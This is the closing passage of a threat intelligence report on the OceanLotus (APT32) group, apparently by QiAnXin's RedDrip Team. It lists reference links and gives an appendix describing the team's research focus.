https://medium.com/@sp1d3rm4n/apt32-oceanlotus-m%E1%BB%99t[chi%E1%BA%BFn-d%E1%BB%8Bch-apt-b%C3%A0i-b%E1%BA%A3n-nh%C6%B0-](https://medium.com/@sp1d3rm4n/apt32-oceanlotus-m%E1%BB%99t-chi%E1%BA%BFn-d%E1%BB%8Bch-apt-b%C3%A0i-b%E1%BA%A3n-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-ph%E1%BA%A7n-2-119a24585d9a)\nth%E1%BA%BF-n%C3%A0o-ph%E1%BA%A7n-2-119a24585d9a\n\n\n-----\n\n[4] [https://twitter.com/blackorbird/status/1086186184768815104](https://twitter.com/blackorbird/status/1086186184768815104)\n\n[5] [https://twitter.com/RedDrip7/status/1119204830633848834](https://twitter.com/RedDrip7/status/1119204830633848834)\n\n## Appendix\n\n**RedDrip Team**\n\nRedDrip Team of QiAnXin (Formly SkyEye Team), founded in 2015, focuses on the\nresearch of APT attacks. As the first team of revealing OceanLotus (APT-C-00) attack,\nRedDrip Team is also a key part of QiAnXin Threat Intelligence Center.\n\nOur team has security analysts, developers, covering full cycle of threat intelligence\noperation: data sourcing, processing, analyzing, and correlation. Our threat intelligence\nsupports QiAnXin products and third party products.\n\nRelying on leading security data capacity and security expertise, we found several\nnoteworthy APT campaigns, including OceanLotus.\n\n\n-----",
